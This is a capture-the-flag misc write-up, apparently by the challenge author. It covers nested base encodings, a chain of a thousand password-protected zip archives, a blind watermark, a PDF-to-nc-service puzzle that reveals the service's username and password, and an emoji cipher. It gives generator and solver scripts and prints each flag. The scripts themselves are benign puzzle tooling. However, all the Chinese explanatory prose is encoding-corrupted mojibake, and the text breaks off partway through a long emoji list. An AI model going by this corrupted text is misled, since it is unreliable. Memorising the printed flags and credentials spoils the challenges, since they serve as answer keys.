<p>å‡ºé¢˜è„šæœ¬å¦‚ä¸‹ï¼Œæˆ‘ç”¨çš„éšæœºæ•°ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“å•¥å¥—äº†å•¥ï¼Œæš´åŠ›ç ´è§£å°±å®Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFlag</span>(<span class="params">i, flag</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">        flag = base64.b16encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">1</span>):</span><br><span class="line">        flag = base64.b32encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">2</span>):</span><br><span class="line">        flag = base64.b64encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">3</span>):</span><br><span class="line">        flag = base64.b85encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;Bas3_1s_s0_b3autifu1!&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    flag = encodeFlag(random.randint(<span class="number">0</span>, <span class="number">3</span>), flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag.encode())</span><br></pre></td></tr></table></figure>
<p>è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b16decode(text).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b32decode(text).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b64decode(text).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    text = base64.b85decode(text).decode()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4i8cfafqj60ca03st8z02.jpg" alt=""></p>
<h3 id="zzzzzziiiiiipppppp"><a href="#zzzzzziiiiiipppppp" class="headerlink" title="zzzzzziiiiiipppppp"></a>zzzzzziiiiiipppppp</h3><p>flag{D0nt_h1t_m3_N0_m0r3_01d_tr1ck5!}</p>
<p>çµæ„Ÿæ¥æºäºctfç”Ÿæ¶¯ä¸­åŠå…¶çŸ­æš‚çš„æ—¶é—´å†…ä»»èŒè¿‡ä¸€ä¸ªmiscæ‰‹è€Œæ‰“è¿‡çš„æ¯”èµ›ä¸­çš„æ— è„‘å¥—å¨ƒé¢˜â€”â€”ã€MRCTFã€‘åƒå±‚å¥—è·¯ï¼Œæœ¬é¢˜åˆé™ä½äº†éš¾åº¦ï¼Œå› ä¸ºå½“æ—¶è§£å‡ºæ¥å¥½åƒ</p>
<p>ç»™äº†å‹ç¼©åŒ…ï¼Œç¨å¾®è¯•è¯•å°±çŸ¥é“å¯†ç æ˜¯æ–‡ä»¶åï¼Œä½†æ˜¯å‹ç¼©åŒ…å¾ˆå¤šï¼Œæ‰‹è§£ä¸å¯èƒ½ï¼Œäºæ˜¯åªèƒ½æ“jioæœ¬</p>
<p>ç¨å¾®æŸ¥æŸ¥å°±çŸ¥é“pythonæœ‰ä¸ªåº“å«zipfileå¯ä»¥è§£ï¼Œä½†æ˜¯å¾ˆæ…¢ï¼Œæ‰€ä»¥ä¼šå†™shell jioæœ¬çš„åŒå­¦åº”è¯¥æ›´å®¹æ˜“æŠ¢åˆ°ä¸€è¡€ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¸ä¼šshell jioæœ¬æ‰€ä»¥ğŸ‘´ğŸ»æ³¨å®šæŠ¢ä¸äº†ä¸€è¡€ï¼Œå› ä¸ºğŸ‘´ğŸ»æ˜¯å‡ºé¢˜äººï¼Œè·‘åäº†</p>
<p>ç°ç»™å‡ºå‡ºé¢˜ç”¨çš„jio æœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compressedFileToCreate</span>(<span class="params">random_number, prev_filename</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;prev:&#x27;</span> + prev_filename)</span><br><span class="line">    filename = <span class="built_in">str</span>(random_number) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    os.system(<span class="string">&quot;zip -P %s %s %s&quot;</span>%(<span class="built_in">str</span>(random_number), filename, prev_filename))</span><br><span class="line">    <span class="keyword">if</span> prev_filename[-<span class="number">4</span>:] == <span class="string">&#x27;.zip&#x27;</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;rm &#x27;</span> + prev_filename)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomNumberGeneration</span>():</span></span><br><span class="line">    number = string.digits</span><br><span class="line">    random_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        index = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">        random_list.append(number[index])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        number = randomNumberGeneration()</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            prev_filename = compressedFileToCreate(number, <span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            prev_filename = compressedFileToCreate(number, prev_filename)</span><br></pre></td></tr></table></figure>
<p>è§£é¢˜è„šæœ¬å¾ˆç®€å•ï¼Œå°±æ˜¯å¾—ç­‰ä¸€ä¼šå„¿ï¼Œç­‰åˆ°æŠ¥é”™çš„æ—¶å€™ï¼Œå°±è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰è§£å¼€ï¼Œæ‰‹åŠ¨è§£å°±å®Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">filename, prev_filename</span>):</span></span><br><span class="line">    fz = zipfile.ZipFile(filename + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fz.extractall(pwd=<span class="built_in">bytes</span>(filename, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    name = fz.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> prev_filename:</span><br><span class="line">        os.system(<span class="string">&#x27;rm &#x27;</span> + prev_filename + <span class="string">&#x27;.zip&#x27;</span>)</span><br><span class="line">    fz.close()</span><br><span class="line">    <span class="keyword">return</span> filename,name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filename = <span class="string">&#x27;8366&#x27;</span>		<span class="comment"># åˆå§‹å‹ç¼©åŒ…æ–‡ä»¶å</span></span><br><span class="line">    prev_filename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prev_filename,filename = exp(filename, prev_filename)</span><br></pre></td></tr></table></figure>
<h3 id="WaterMark"><a href="#WaterMark" class="headerlink" title="WaterMark"></a>WaterMark</h3><p>å‡ºé¢˜æ€è·¯ï¼šå›¾ç‰‡ç›²æ°´å°ï¼Œforemost ç„¶åç”¨ç›²æ°´å°è„šæœ¬ä¸€æŠŠæ¢­</p>
<p>flag{water_mark_is_so_fun}</p>
<h3 id="letter"><a href="#letter" class="headerlink" title="letter"></a>letter</h3><p>é™„ä»¶ç»™äº†ä¸€ä¸ªpdf</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5q8fuo9aj61ec0rewjh02.jpg" alt=""></p>
<p>æ³¨æ„åˆ°åé¢æœ‰ä¸ªncåœ°å€ï¼Œè¿ä¸Šå»å‘ç°éœ€è¦è¾“å…¥usernameå’Œpasswordï¼Œä½†æ˜¯ä¸çŸ¥é“ï¼Œpdfä¸­æœ‰usernameå’Œpasswordï¼Œè™½ç„¶æŒ¡ä½äº†ï¼Œä½†æ˜¯èƒ½å¤Ÿç›´æ¥å¤åˆ¶å‡ºæ¥ï¼Œå¾—åˆ°usernameå’Œpasswordåˆ†åˆ«ä¸ºlemonå’Œl3m0n_l0v3_rgbï¼Œç„¶åncè¿ä¸Šå»è¾“å…¥ç”¨æˆ·åå’Œå¯†ç </p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qpl745kj614g0d2mzg02.jpg" alt=""></p>
<p>è·å¾—ä¸€ä¸ªç½‘å€ï¼Œæˆ‘ä»¬ç”¨webç«¯è®¿é—®ä¸€ä¸‹çœ‹çœ‹</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qtajoe8j60qk0jgq4i02.jpg" alt=""></p>
<p>æœ‰ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥åº·åº·</p>
<p>éƒ¨åˆ†å†…å®¹ï¼š</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qttlz10j60d00ii0tz02.jpg" alt=""></p>
<p>ç»“åˆåˆšæ‰çš„å¯†ç ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯ä¸ªrgbå›¾åƒçš„åƒç´ ç‚¹ï¼Œå¹¶ä¸”è¿˜ç»™äº†å®½å’Œé«˜ï¼Œåˆ©ç”¨PILåº“åˆæˆåƒç´ ç‚¹è·å¾—flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">2012</span></span><br><span class="line">y = <span class="number">1014</span></span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./tmp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:		<span class="comment"># è®°å¾—åˆ æ‰å‰ä¸¤è¡Œçš„å®½å’Œé«˜æ–¹ä¾¿æ•°æ®å¤„ç†</span></span><br><span class="line">    <span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,x):</span><br><span class="line">        <span class="keyword">for</span> height <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,y):</span><br><span class="line">            line = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">            rgb = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            img.putpixel((width,height),(<span class="built_in">int</span>(rgb[<span class="number">0</span>]),<span class="built_in">int</span>(rgb[<span class="number">1</span>]),<span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qvelkd1j61dl0u00w002.jpg" alt=""></p>
<p>flag{l3m0n_10v3_pdf_and_rgb}</p>
<h3 id="emoji-master"><a href="#emoji-master" class="headerlink" title="emoji-master"></a>emoji-master</h3><h4 id="å‡ºé¢˜äººè§†è§’"><a href="#å‡ºé¢˜äººè§†è§’" class="headerlink" title="å‡ºé¢˜äººè§†è§’"></a>å‡ºé¢˜äººè§†è§’</h4><p>ğŸ‘´ğŸ»å°±æ˜¯æŠ½è±¡ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªé¢˜ï¼Œè‡´æ•¬æŠ½è±¡æ–‡å­¦</p>
<p>ç°ç¿»äº†ç¿»emojicodeå°±æŒºæœ‰æ„æ€ï¼Œæœ¬æ¥å¯ä»¥æ”¾å­—ç¬¦ä¸²çš„ï¼Œä½†æ˜¯æ²¡æœ‰èŠ‚ç›®æ•ˆæœï¼Œæ‰€ä»¥æ”¹æˆäº†emojiç¼–ç ï¼Œä½†æ˜¯æœ‰hintï¼Œé—®é¢˜ä¸å¤§</p>
<p>emojiéšæœºç”Ÿæˆè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> emoji</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">emoji_list = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">:bowtie:</span></span><br><span class="line"><span class="string">:smile:</span></span><br><span class="line"><span class="string">:simple_smile:</span></span><br><span class="line"><span class="string">:laughing:</span></span><br><span class="line"><span class="string">:blush:</span></span><br><span class="line"><span class="string">:smiley:</span></span><br><span class="line"><span class="string">:relaxed:</span></span><br><span class="line"><span class="string">:smirk:</span></span><br><span class="line"><span class="string">:heart_eyes:</span></span><br><span class="line"><span class="string">:kissing_heart:</span></span><br><span class="line"><span class="string">:kissing_closed_eyes:</span></span><br><span class="line"><span class="string">:flushed:</span></span><br><span class="line"><span class="string">:relieved:</span></span><br><span class="line"><span class="string">:satisfied:</span></span><br><span class="line"><span class="string">:grin:</span></span><br><span class="line"><span class="string">:wink:</span></span><br><span class="line"><span class="string">:stuck_out_tongue_winking_eye:</span></span><br><span class="line"><span class="string">:stuck_out_tongue_closed_eyes:</span></span><br><span class="line"><span class="string">:grinning:</span></span><br><span class="line"><span class="string">:kissing:</span></span><br><span class="line"><span class="string">:kissing_smiling_eyes:</span></span><br><span class="line"><span class="string">:stuck_out_tongue:</span></span><br><span class="line"><span class="string">:sleeping:</span></span><br><span class="line"><span class="string">:worried:</span></span><br><span class="line"><span class="string">:frowning:</span></span><br><span class="line"><span class="string">:anguished:</span></span><br><span class="line"><span class="string">:open_mouth:</span></span><br><span class="line"><span class="string">:grimacing:</span></span><br><span class="line"><span class="string">:confused:</span></span><br><span class="line"><span class="string">:hushed:</span></span><br><span class="line"><span class="string">:expressionless:</span></span><br><span class="line"><span class="string">:unamused:</span></span><br><span class="line"><span class="string">:sweat_smile:</span></span><br><span class="line"><span class="string">:sweat:</span></span><br><span class="line"><span class="string">:disappointed_relieved:</span></span><br><span class="line"><span class="string">:weary:</span></span><br><span class="line"><span class="string">:pensive:</span></span><br><span class="line"><span class="string">:disappointed:</span></span><br><span class="line"><span class="string">:confounded:</span></span><br><span class="line"><span class="string">:fearful:</span></span><br><span class="line"><span class="string">:cold_sweat:</span></span><br><span class="line"><span class="string">:persevere:</span></span><br><span class="line"><span class="string">:cry:</span></span><br><span class="line"><span class="string">:sob:</span></span><br><span class="line"><span class="string">:joy:</span></span><br><span class="line"><span class="string">:astonished:</span></span><br><span class="line"><span class="string">:scream:</span></span><br><span class="line"><span class="string">:neckbeard:</span></span><br><span class="line"><span class="string">:tired_face:</span></span><br><span class="line"><span class="string">:angry:</span></span><br><span class="line"><span class="string">:rage:</span></span><br><span class="line"><span class="string">:triumph:</span></span><br><span class="line"><span class="string">:sleepy:</span></span><br><span class="line"><span class="string">:yum:</span></span><br><span class="line"><span class="string">:mask:</span></span><br><span class="line"><span class="string">:sunglasses:</span></span><br><span class="line"><span class="string">:dizzy_face:</span></span><br><span class="line"><span class="string">:imp:</span></span><br><span class="line"><span class="string">:smiling_imp:</span></span><br><span class="line"><span class="string">:neutral_face:</span></span><br><span class="line"><span class="string">:no_mouth:</span></span><br><span class="line"><span class="string">:innocent:</span></span><br><span class="line"><span class="string">:alien:</span></span><br><span class="line"><span class="string">:yellow_heart:</span></span><br><span class="line"><span class="string">:blue_heart:</span></span><br><span class="line"><span class="string">:purple_heart:</span></span><br><span class="line"><span class="string">:heart:</span></span><br><span class="line"><span class="string">:green_heart:</span></span><br><span class="line"><span class="string">:broken_heart:</span></span><br><span class="line"><span class="string">:heartbeat:</span></span><br><span class="line"><span class="string">:heartpulse:</span></span><br><span class="line"><span class="string">:two_hearts:</span></span><br><span class="line"><span class="string">:revolving_hearts:</span></span><br><span class="line"><span class="string">:cupid:</span></span><br><span class="line"><span class="string">:sparkling_heart:</span></span><br><span class="line"><span class="string">:sparkles:</span></span><br><span class="line"><span class="string">:star:</span></span><br><span class="line"><span class="string">:star2:</span></span><br><span class="line"><span class="string">:dizzy:</span></span><br><span class="line"><span class="string">:boom:</span></span><br><span class="line"><span class="string">:collision:</span></span><br><span class="line"><span class="string">:anger:</span></span><br><span class="line"><span class="string">:exclamation:</span></span><br><span class="line"><span class="string">:question:</span></span><br><span class="line"><span class="string">:grey_exclamation:</span></span><br><span class="line"><span class="string">:grey_question:</span></span><br><span class="line"><span class="string">:zzz:</span></span><br><span class="line"><span class="string">:dash:</span></span><br><span class="line"><span class="string">:sweat_drops:</span></span><br><span class="line"><span class="string">:notes:</span></span><br><span class="line"><span class="string">:musical_note:</span></span><br><span class="line"><span class="string">:fire:</span></span><br><span class="line"><span class="string">:hankey:</span></span><br><span class="line"><span class="string">:poop:</span></span><br><span class="line"><span class="string">:shit:</span></span><br><span class="line"><span class="string">:+1:</span></span><br><span class="line"><span class="string">:thumbsup:</span></span><br><span class="line"><span class="string">:-1:</span></span><br><span class="line"><span class="string">:thumbsdown:</span></span><br><span class="line"><span class="string">:ok_hand:</span></span><br><span class="line"><span class="string">:punch:</span></span><br><span class="line"><span class="string">:facepunch:</span></span><br><span class="line"><span class="string">:fist:</span></span><br><span class="line"><span class="string">:v:</span></span><br><span class="line"><span class="string">:wave:</span></span><br><span class="line"><span class="string">:hand:</span></span><br><span class="line"><span class="string">:raised_hand:</span></span><br><span class="line"><span class="string">:open_hands:</span></span><br><span class="line"><span class="string">:point_up:</span></span><br><span class="line"><span class="string">:point_down:</span></span><br><span class="line"><span class="string">:point_left:</span></span><br><span class="line"><span class="string">:point_right:</span></span><br><span class="line"><span class="string">:raised_hands:</span></span><br><span class="line"><span class="string">:pray:</span></span><br><span class="line"><span class="string">:point_up_2:</span></span><br><span class="line"><span class="string">:clap:</span></span><br><span class="line"><span class="string">:muscle:</span></span><br><span class="line"><span class="string">:metal:</span></span><br><span class="line"><span class="string">:fu:</span></span><br><span class="line"><span class="string">:runner:</span></span><br><span class="line"><span class="string">:running:</span></span><br><span class="line"><span class="string">:couple:</span></span><br><span class="line"><span class="string">:family:</span></span><br><span class="line"><span class="string">:two_men_holding_hands:</span></span><br><span class="line"><span class="string">:two_women_holding_hands:</span></span><br><span class="line"><span class="string">:dancer:</span></span><br><span class="line"><span class="string">:dancers:</span></span><br><span class="line"><span class="string">:ok_woman:</span></span><br><span class="line"><span class="string">:no_good:</span></span><br><span class="line"><span class="string">:information_desk_person:</span></span><br><span class="line"><span class="string">:raising_hand:</span></span><br><span class="line"><span class="string">:bride_with_veil:</span></span><br><span class="line"><span class="string">:person_with_pouting_face:</span></span><br><span class="line"><span class="string">:person_frowning:</span></span><br><span class="line"><span class="string">:bow:</span></span><br><span class="line"><span class="string">:couplekiss:</span></span><br><span class="line"><span class="string">:couple_with_heart:</span></span><br><span class="line"><span class="string">:massage:</span></span><br><span class="line"><span class="string">:haircut:</span></span><br><span class="line"><span class="string">:nail_care:</span></span><br><span class="line"><span class="string">:boy:</span></span><br><span class="line"><span class="string">:girl:</span></span><br><span class="line"><span class="string">:woman:</span></span><br><span class="line"><span class="string">:man:</span></span><br><span class="line"><span class="string">:baby:</span></span><br><span class="line"><span class="string">:older_woman:</span></span><br><span class="line"><span class="string">:older_man:</span></span><br><span class="line"><span class="string">:person_with_blond_hair:</span></span><br><span class="line"><span class="string">:man_with_gua_pi_mao:</span></span><br><span class="line"><span class="string">:man_with_turban:</span></span><br><span class="line"><span class="string">:construction_worker:</span></span><br><span class="line"><span class="string">:cop:</span></span><br><span class="line"><span class="string">:angel:</span></span><br><span class="line"><span class="string">:princess:</span></span><br><span class="line"><span class="string">:smiley_cat:</span></span><br><span class="line"><span class="string">:smile_cat:</span></span><br><span class="line"><span class="string">:heart_eyes_cat:</span></span><br><span class="line"><span class="string">:kissing_cat:</span></span><br><span class="line"><span class="string">:smirk_cat:</span></span><br><span class="line"><span class="string">:scream_cat:</span></span><br><span class="line"><span class="string">:crying_cat_face:</span></span><br><span class="line"><span class="string">:joy_cat:</span></span><br><span class="line"><span class="string">:pouting_cat:</span></span><br><span class="line"><span class="string">:japanese_ogre:</span></span><br><span class="line"><span class="string">:japanese_goblin:</span></span><br><span class="line"><span class="string">:see_no_evil:</span></span><br><span class="line"><span class="string">:hear_no_evil:</span></span><br><span class="line"><span class="string">:speak_no_evil:</span></span><br><span class="line"><span class="string">:guardsman:</span></span><br><span class="line"><span class="string">:skull:</span></span><br><span class="line"><span class="string">:feet:</span></span><br><span class="line"><span class="string">:lips:</span></span><br><span class="line"><span class="string">:kiss:</span></span><br><span class="line"><span class="string">:droplet:</span></span><br><span class="line"><span class="string">:ear:</span></span><br><span class="line"><span class="string">:eyes:</span></span><br><span class="line"><span class="string">:nose:</span></span><br><span class="line"><span class="string">:tongue:</span></span><br><span class="line"><span class="string">:love_letter:</span></span><br><span class="line"><span class="string">:bust_in_silhouette:</span></span><br><span class="line"><span class="string">:busts_in_silhouette:</span></span><br><span class="line"><span class="string">:speech_balloon:</span></span><br><span class="line"><span class="string">:thought_balloon:</span></span><br><span class="line"><span class="string">:feelsgood:</span></span><br><span class="line"><span class="string">:finnadie:</span></span><br><span class="line"><span class="string">:goberserk:</span></span><br><span class="line"><span class="string">:godmode:</span></span><br><span class="line"><span class="string">:hurtrealbad:</span></span><br><span class="line"><span class="string">:rage1:</span></span><br><span class="line"><span class="string">:rage2:</span></span><br><span class="line"><span class="string">:rage3:</span></span><br><span class="line"><span class="string">:rage4:</span></span><br><span class="line"><span class="string">:suspect:</span></span><br><span class="line"><span class="string">:trollface:</span></span><br><span class="line"><span class="string">:sunny:</span></span><br><span class="line"><span class="string">:umbrella:</span></span><br><span class="line"><span class="string">:cloud:</span></span><br><span class="line"><span class="string">:snowflake:</span></span><br><span class="line"><span class="string">:snowman:</span></span><br><span class="line"><span class="string">:zap:</span></span><br><span class="line"><span class="string">:cyclone:</span></span><br><span class="line"><span class="string">:foggy:</span></span><br><span class="line"><span class="string">:ocean:</span></span><br><span class="line"><span class="string">:cat:</span></span><br><span class="line"><span class="string">:dog:</span></span><br><span class="line"><span class="string">:mouse:</span></span><br><span class="line"><span class="string">:hamster:</span></span><br><span class="line"><span class="string">:rabbit:</span></span><br><span class="line"><span class="string">:wolf:</span></span><br><span class="line"><span class="string">:frog:</span></span><br><span class="line"><span class="string">:tiger:</span></span><br><span class="line"><span class="string">:koala:</span></span><br><span class="line"><span class="string">:bear:</span></span><br><span class="line"><span class="string">:pig:</span></span><br><span class="line"><span class="string">:pig_nose:</span></span><br><span class="line"><span class="string">:cow:</span></span><br><span class="line"><span class="string">:boar:</span></span><br><span class="line"><span class="string">:monkey_face:</span></span><br><span class="line"><span class="string">:monkey:</span></span><br><span class="line"><span class="string">:horse:</span></span><br><span class="line"><span class="string">:racehorse:</span></span><br><span class="line"><span class="string">:camel:</span></span><br><span class="line"><span class="string">:sheep:</span></span><br><span class="line"><span class="string">:elephant:</span></span><br><span class="line"><span class="string">:panda_face:</span></span><br><span class="line"><span class="string">:snake:</span></span><br><span class="line"><span class="string">:bird:</span></span><br><span class="line"><span class="string">:baby_chick:</span></span><br><span class="line"><span class="string">:hatched_chick:</span></span><br><span class="line"><span class="string">:hatching_chick:</span></span><br><span class="line"><span class="string">:chicken:</span></span><br><span class="line"><span class="string">:penguin:</span></span><br><span class="line"><span class="string">:turtle:</span></span><br><span class="line"><span class="string">:bug:</span></span><br><span class="line"><span class="string">:honeybee:</span></span><br><span class="line"><span class="string">:ant:</span></span><br><span class="line"><span class="string">:beetle:</span></span><br><span class="line"><span class="string">:snail:</span></span><br><span class="line"><span class="string">:octopus:</span></span><br><span class="line"><span class="string">:tropical_fish:</span></span><br><span class="line"><span class="string">:fish:</span></span><br><span class="line"><span class="string">:whale:</span></span><br><span class="line"><span class="string">:whale2:</span></span><br><span class="line"><span class="string">:dolphin:</span></span><br><span class="line"><span class="string">:cow2:</span></span><br><span class="line"><span class="string">:ram:</span></span><br><span class="line"><span class="string">:rat:</span></span><br><span class="line"><span class="string">:water_buffalo:</span></span><br><span class="line"><span class="string">:tiger2:</span></span><br><span class="line"><span class="string">:rabbit2:</span></span><br><span class="line"><span class="string">:dragon:</span></span><br><span class="line"><span class="string">:goat:</span></span><br><span class="line"><span class="string">:rooster:</span></span><br><span class="line"><span class="string">:dog2:</span></span><br><span class="line"><span class="string">:pig2:</span></span><br><span class="line"><span class="string">:mouse2:</span></span><br><span class="line"><span class="string">:ox:</span></span><br><span class="line"><span class="string">:dragon_face:</span></span><br><span class="line"><span class="string">:blowfish:</span></span><br><span class="line"><span class="string">:crocodile:</span></span><br><span class="line"><span class="string">:dromedary_camel:</span></span><br><span class="line"><span class="string">:leopard:</span></span><br><span class="line"><span class="string">:cat2:</span></span><br><span class="line"><span class="string">:poodle:</span></span><br><span class="line"><span class="string">:paw_prints:</span></span><br><span class="line"><span class="string">:bouquet:</span></span><br><span class="line"><span class="string">:cherry_blossom:</span></span><br><span class="line"><span class="string">:tulip:</span></span><br><span class="line"><span class="string">:four_leaf_clover:</span></span><br><span class="line"><span class="string">:rose:</span></span><br><span class="line"><span class="string">:sunflower:</span></span><br><span class="line"><span class="string">:hibiscus:</span></span><br><span class="line"><span class="string">:maple_leaf:</span></span><br><span class="line"><span class="string">:leaves:</span></span><br><span class="line"><span class="string">:fallen_leaf:</span></span><br><span class="line"><span class="string">:herb:</span></span><br><span class="line"><span class="string">:mushroom:</span></span><br><span class="line"><span class="string">:cactus:</span></span><br><span class="line"><span class="string">:palm_tree:</span></span><br><span class="line"><span class="string">:evergreen_tree:</span></span><br><span class="line"><span class="string">:deciduous_tree:</span></span><br><span class="line"><span class="string">:chestnut:</span></span><br><span class="line"><span class="string">:seedling:</span></span><br><span class="line"><span class="string">:blossom:</span></span><br><span class="line"><span class="string">:ear_of_rice:</span></span><br><span class="line"><span class="string">:shell:</span></span><br><span class="line"><span class="string">:globe_with_meridians:</span></span><br><span class="line"><span class="string">:sun_with_face:</span></span><br><span class="line"><span class="string">:full_moon_with_face:</span></span><br><span class="line"><span class="string">:new_moon_with_face:</span></span><br><span class="line"><span class="string">:new_moon:</span></span><br><span class="line"><span class="string">:waxing_crescent_moon:</span></span><br><span class="line"><span class="string">:first_quarter_moon:</span></span><br><span class="line"><span class="string">:waxing_gibbous_moon:</span></span><br><span class="line"><span class="string">:full_moon:</span></span><br><span class="line"><span class="string">:waning_gibbous_moon:</span></span><br><span class="line"><span class="string">:last_quarter_moon:</span></span><br><span class="line"><span class="string">:waning_crescent_moon:</span></span><br><span class="line"><span class="string">:last_quarter_moon_with_face:</span></span><br><span class="line"><span class="string">:first_quarter_moon_with_face:</span></span><br><span class="line"><span class="string">:crescent_moon:</span></span><br><span class="line"><span class="string">:earth_africa:</span></span><br><span class="line"><span class="string">:earth_americas:</span></span><br><span class="line"><span class="string">:earth_asia:</span></span><br><span class="line"><span class="string">:volcano:</span></span><br><span class="line"><span class="string">:milky_way:</span></span><br><span class="line"><span class="string">:partly_sunny:</span></span><br><span class="line"><span class="string">:octocat:</span></span><br><span class="line"><span class="string">:squirrel:</span></span><br><span class="line"><span class="string">:bamboo:</span></span><br><span class="line"><span class="string">:gift_heart:</span></span><br><span class="line"><span class="string">:dolls:</span></span><br><span class="line"><span class="string">:school_satchel:</span></span><br><span class="line"><span class="string">:mortar_board:</span></span><br><span class="line"><span class="string">:flags:</span></span><br><span class="line"><span class="string">:fireworks:</span></span><br><span class="line"><span class="string">:sparkler:</span></span><br><span class="line"><span class="string">:wind_chime:</span></span><br><span class="line"><span class="string">:rice_scene:</span></span><br><span class="line"><span class="string">:jack_o_lantern:</span></span><br><span class="line"><span class="string">:ghost:</span></span><br><span class="line"><span class="string">:santa:</span></span><br><span class="line"><span class="string">:christmas_tree:</span></span><br><span class="line"><span 